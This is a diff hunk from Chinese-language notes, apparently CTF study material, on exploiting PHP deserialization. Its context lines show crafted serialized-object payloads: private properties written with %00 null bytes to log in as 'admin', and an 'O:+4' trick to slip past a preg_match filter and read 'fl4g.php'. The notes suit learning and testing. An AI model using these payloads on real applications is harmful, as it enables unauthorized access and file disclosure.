@@ -175,7 +175,7 @@ O:4:"Name":2:{s:14:"口Name口username";s:6:"admine";s:14:"口Name口password";s
 会有口，改为%00
 O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
 
-如果private需要base64编码的，就在代码里替换并编码
+如果private需要base64编码的，就在代码里替换并编码，防止口编码后不同值。
 $C = serialize($a);
 //string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
 $C = str_replace('O:4', 'O:+4',$C);//绕过preg_match
